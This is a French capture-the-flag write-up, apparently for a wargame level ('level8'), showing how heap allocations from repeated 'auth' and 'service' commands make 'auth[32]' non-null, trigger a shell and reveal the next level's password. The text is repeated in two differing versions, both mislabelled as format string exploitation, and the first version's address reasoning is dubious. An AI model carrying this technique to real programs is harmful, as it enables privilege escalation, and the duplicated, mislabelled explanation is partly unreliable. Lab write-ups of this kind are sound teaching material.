
# Format String Exploitation

  

En décompilant le programme exécute différents tests pour arriver à un test final. Si cette condition est respectée, alors un shell avec les droits de `level9` sera lancé.
```C
eax = auth;
eax = *((eax + 0x20));
if (eax != 0) {
	system ("/bin/sh");
	goto label_0;
}
```
`0x20` équivaut à 32 en base10. Au vu du code,  cette condition semble être 
```C
if (auth[32] != '\0') {
	system ("/bin/sh");`
}
```
Pour arriver jusqu'a cette condition, il vas nous falloir plusieurs étapes. 
On ne peut pas écrire 32 caractères directement sur `auth` puisqu'il y a cette condition : 
```C
if (str1 < 0x1f) {
	strcpy(_auth, acStack139);
}
```
`0x1f` correpond à 31 en base 10. On peut donc écrire au maximum 30 caractères sur `auth `.
On remarque, que lorsqu'on saisit `auth `, cela va faire un `malloc` de 4 puis mettre sa valeur à 0.
```C
_auth = (undefined4 *)malloc(4);
``` 
On peut néanmoins observer que nos adresses `auth` et `service` sont très proche (désassembleur Cutter). 
```
auth:
0x08049aac add byte  [eax], al
0x08049aae add byte  [eax], al
service:
0x08049ab0 add byte  [eax], al
0x08049ab2 add byte  [eax], al
```

```
0x08049ab0 - 0x08049aac = 0x4
0x08049ab2 - 0x08049aae = 0x4
```
Nos adresse sont juste à coté. Donc :
```
auth[32] = service[28] 
```
Dans la partie de code qui correspond à `service`, on observe ce bout de code :
```C
_service = strdup(auStack137);
```
En regardant le `man` de `strdup`, on est tombé sur cela : 
```
The strdup() function allocates memory and copies into it the string addressed by _s1_, including the terminating null character
```
Cela signifie qu'un `\0` va être ajouté en bout de chaine. 
Il faut donc que l'on écrive plus de 28 caractères pour que `service[28] != '\0'`.

Pour rentrer dans la dernière condition de check `if auth[32] != '\0'`, il faut que notre dernière `input`soit `login`.

On va donc faire : 
```
> ./level8
[...]
> auth 
0x804a008, (nil)
> service AAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
> login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
``` 


# Format String Exploitation

  

En décompilant le programme exécute différents tests pour arriver à un test final. Si cette condition est respectée, alors un shell avec les droits de `level9` sera lancé.
```C
eax = auth;
eax = *((eax + 0x20));
if (eax != 0) {
	system ("/bin/sh");
	goto label_0;
}
```
`0x20` équivaut à 32 en base10. Au vu du code,  cette condition semble être 
```C
if (auth[32] != '\0') {
	system ("/bin/sh");`
}
```
Pour arriver jusqu'a cette condition, il vas nous falloir plusieurs étapes. 
On ne peut pas écrire 32 caractères directement sur `auth` puisqu'il y a cette condition : 
```C
if (str1 < 0x1f) {
	strcpy(_auth, acStack139);
}
```
`0x1f` correpond à 31 en base 10. On peut donc écrire au maximum 30 caractères sur `auth `.
On remarque, que lorsqu'on saisit `auth `, cela va faire un `malloc` de 4 puis mettre sa valeur à 0.
```C
_auth = (undefined4 *)malloc(4);
``` 
Faisons quelques tests. 
```
> ./level8
[...]
> auth 
0x804a008, (nil)
service
0x804a008, 0x804a018
service
0x804a008, 0x804a028
```
Il vient de se passer quelque chose de très intéressant. 
On a vu précédemment `auth + 0x20 !='\0'`.
Il semblerait que lorsqu'on saisis quelque choses, le programme nous affiche leur adresse.
Lorsqu'on à saisis une première fois `service`, on a vu que notre adresse a augmenté de `0x10`. Lorsqu'on l'a ressaisis une seconde fois, on a vu que l'adresse avait augmenté de 0x20.

Dans la partie de code qui correspond à `service`, on observe ce bout de code :
```C
_service = strdup(auStack137);
```
En regardant le `man` de `strdup`, on est tombé sur cela : 
```
The strdup() function allocates memory and copies into it the string addressed by _s1_, including the terminating null character
```
Cela signifie qu'un `\0` va être ajouté en bout de chaine. 

On peut donc refaire cette manipulation puis finir par login.

```
> ./level8
[...]
> auth 
0x804a008, (nil)
> service
0x804a008, 0x804a018
> service
0x804a008, 0x804a028
> login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
``` 
